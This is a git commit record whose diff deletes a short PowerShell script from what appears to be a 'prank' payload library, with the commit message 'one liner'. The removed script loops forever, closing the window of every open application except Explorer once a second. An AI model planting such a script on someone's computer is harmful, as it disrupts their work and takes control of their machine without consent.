f6ed30e2f33b7fb8b6b1e07645270d23396db37d
dsymbol <arctisfire@protonmail.com>
2022-12-09 11:25:36 +0200

    one liner

--- payloads/library/prank/ProcessTerminator/pt.ps1
+++
@@ -1,9 +0,0 @@
-while (1) {
-    $ws = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 }
-    foreach ($w in $ws) {
-        if ($w.ProcessName -ne 'explorer' -and $w.Id -ne $PID) {
-            $w.CloseMainWindow()
-        }
-    }
-    Start-Sleep -Seconds 1
-}
